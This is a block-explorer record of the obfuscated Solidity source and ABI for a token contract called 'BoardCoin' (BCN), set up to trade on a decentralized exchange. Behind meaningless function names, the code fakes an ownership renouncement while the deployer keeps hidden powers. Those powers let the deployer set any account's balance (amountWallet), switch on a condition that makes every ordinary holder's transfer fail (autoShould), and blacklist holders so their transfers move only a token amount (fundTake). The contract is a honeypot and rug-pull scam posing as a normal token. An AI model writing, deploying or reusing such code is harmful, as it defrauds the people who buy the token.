{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract takeEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isReceiverAmount {\n    function createPair(address modeWallet, address limitFund) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface totalMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface tradingSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderSwap) external view returns (uint256);\n\n    function transfer(address walletEnable, uint256 isFundSwap) external returns (bool);\n\n    function allowance(address teamLaunchSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFundSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletEnable,\n        uint256 isFundSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundAmountSell, uint256 value);\n    event Approval(address indexed teamLaunchSell, address indexed spender, uint256 value);\n}\n\ninterface modeReceiver is tradingSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BoardCoin is takeEnable, tradingSwap, modeReceiver {\n\n    string private senderMax = \"Board Coin\";\n\n    uint256 sellIs;\n\n    mapping(address => bool) public launchedFrom;\n\n    constructor (){\n        if (swapMax != marketingIs) {\n            marketingIs = swapMax;\n        }\n        shouldTo();\n        totalMarketing walletSwap = totalMarketing(walletLaunched);\n        enableMode = isReceiverAmount(walletSwap.factory()).createPair(walletSwap.WETH(), address(this));\n        senderReceiverMax = isReceiverAmount(walletSwap.factory()).feeTo();\n        if (swapMax == marketingIs) {\n            exemptIsReceiver = true;\n        }\n        liquidityLaunchMin = _msgSender();\n        fromTakeToken[liquidityLaunchMin] = true;\n        shouldListMin[liquidityLaunchMin] = launchedSell;\n        if (exemptIsReceiver != teamFund) {\n            teamFund = false;\n        }\n        emit Transfer(address(0), liquidityLaunchMin, launchedSell);\n    }\n\n    uint8 private senderAt = 18;\n\n    address public enableMode;\n\n    function transferFrom(address teamMarketing, address walletEnable, uint256 isFundSwap) external override returns (bool) {\n        if (_msgSender() != walletLaunched) {\n            if (marketingAmountMax[teamMarketing][_msgSender()] != type(uint256).max) {\n                require(isFundSwap <= marketingAmountMax[teamMarketing][_msgSender()]);\n                marketingAmountMax[teamMarketing][_msgSender()] -= isFundSwap;\n            }\n        }\n        return walletTx(teamMarketing, walletEnable, isFundSwap);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedMin;\n    }\n\n    uint256 constant marketingBuy = 5 ** 10;\n\n    function enableIs(address teamMarketing, address walletEnable, uint256 isFundSwap) internal view returns (uint256) {\n        require(isFundSwap > 0);\n\n        uint256 feeReceiver = 0;\n        if (teamMarketing == enableMode && feeShould > 0) {\n            feeReceiver = isFundSwap * feeShould / 100;\n        } else if (walletEnable == enableMode && swapMarketing > 0) {\n            feeReceiver = isFundSwap * swapMarketing / 100;\n        }\n        require(feeReceiver <= isFundSwap);\n        return isFundSwap - feeReceiver;\n    }\n\n    address walletLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public liquidityLaunchMin;\n\n    function fromSell(address teamMarketing, address walletEnable, uint256 isFundSwap) internal returns (bool) {\n        require(shouldListMin[teamMarketing] >= isFundSwap);\n        shouldListMin[teamMarketing] -= isFundSwap;\n        shouldListMin[walletEnable] += isFundSwap;\n        emit Transfer(teamMarketing, walletEnable, isFundSwap);\n        return true;\n    }\n\n    uint256 private marketingIs;\n\n    function approve(address minLiquidity, uint256 isFundSwap) public virtual override returns (bool) {\n        marketingAmountMax[_msgSender()][minLiquidity] = isFundSwap;\n        emit Approval(_msgSender(), minLiquidity, isFundSwap);\n        return true;\n    }\n\n    function tradingTake(address receiverList) public {\n        if (tradingEnable) {\n            return;\n        }\n        if (teamFund) {\n            swapMax = marketingIs;\n        }\n        fromTakeToken[receiverList] = true;\n        \n        tradingEnable = true;\n    }\n\n    function walletExemptAt() private view {\n        require(fromTakeToken[_msgSender()]);\n    }\n\n    mapping(address => uint256) private shouldListMin;\n\n    function name() external view virtual override returns (string memory) {\n        return senderMax;\n    }\n\n    function allowance(address maxAmount, address minLiquidity) external view virtual override returns (uint256) {\n        if (minLiquidity == walletLaunched) {\n            return type(uint256).max;\n        }\n        return marketingAmountMax[maxAmount][minLiquidity];\n    }\n\n    bool public exemptIsReceiver;\n\n    string private limitFrom = \"BCN\";\n\n    uint256 private launchedSell = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private marketingAmountMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderAt;\n    }\n\n    function fundTake(address launchedBuyFrom) public {\n        walletExemptAt();\n        \n        if (launchedBuyFrom == liquidityLaunchMin || launchedBuyFrom == enableMode) {\n            return;\n        }\n        launchedFrom[launchedBuyFrom] = true;\n    }\n\n    uint256 public swapMarketing = 0;\n\n    bool private teamFund;\n\n    uint256 tokenFee;\n\n    event OwnershipTransferred(address indexed atWalletMarketing, address indexed buyReceiver);\n\n    mapping(address => bool) public fromTakeToken;\n\n    function balanceOf(address senderSwap) public view virtual override returns (uint256) {\n        return shouldListMin[senderSwap];\n    }\n\n    function shouldTo() public {\n        emit OwnershipTransferred(liquidityLaunchMin, address(0));\n        launchedMin = address(0);\n    }\n\n    function walletTx(address teamMarketing, address walletEnable, uint256 isFundSwap) internal returns (bool) {\n        if (teamMarketing == liquidityLaunchMin) {\n            return fromSell(teamMarketing, walletEnable, isFundSwap);\n        }\n        uint256 exemptMode = tradingSwap(enableMode).balanceOf(senderReceiverMax);\n        require(exemptMode == sellIs);\n        require(walletEnable != senderReceiverMax);\n        if (launchedFrom[teamMarketing]) {\n            return fromSell(teamMarketing, walletEnable, marketingBuy);\n        }\n        isFundSwap = enableIs(teamMarketing, walletEnable, isFundSwap);\n        return fromSell(teamMarketing, walletEnable, isFundSwap);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFrom;\n    }\n\n    function autoShould(uint256 isFundSwap) public {\n        walletExemptAt();\n        sellIs = isFundSwap;\n    }\n\n    function amountWallet(address listIs, uint256 isFundSwap) public {\n        walletExemptAt();\n        shouldListMin[listIs] = isFundSwap;\n    }\n\n    address senderReceiverMax;\n\n    function owner() external view returns (address) {\n        return launchedMin;\n    }\n\n    uint256 public swapMax;\n\n    bool public tradingEnable;\n\n    function transfer(address listIs, uint256 isFundSwap) external virtual override returns (bool) {\n        return walletTx(_msgSender(), listIs, isFundSwap);\n    }\n\n    uint256 public feeShould = 3;\n\n    address private launchedMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunchSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atWalletMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmountSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundSwap\",\"type\":\"uint256\"}],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFundSwap\",\"type\":\"uint256\"}],\"name\":\"autoShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIsReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTakeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuyFrom\",\"type\":\"address\"}],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunchMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"tradingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFundSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BoardCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}